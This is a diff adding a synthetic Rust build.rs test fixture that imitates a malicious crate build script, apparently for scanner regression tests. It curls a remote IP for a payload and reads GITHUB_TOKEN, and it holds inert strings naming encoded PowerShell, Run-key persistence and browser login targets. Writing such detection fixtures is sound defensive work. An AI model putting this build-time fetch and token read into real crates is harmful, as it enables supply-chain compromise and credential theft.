@@ -1,0 +1,13 @@
+// SAFE SYNTHETIC FIXTURE. This is source text named like a crate archive.
+// It is never compiled or executed.
+// The fixture represents a malicious-looking build.rs for regression tests.
+fn main() {
+    let _ = std::process::Command::new("curl")
+        .arg("https://23.254.165.112:9089/rust-crate_0.1.0")
+        .status();
+    let _token = std::env::var("GITHUB_TOKEN");
+    // PowerShell and persistence markers are inert strings for static tests.
+    let _windows = "powershell -enc SAFE_FIXTURE; HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    let _browser = "Chrome Edge Brave login domains extensions";
+    let _dga = "five-day DGA fallback domain";
+}
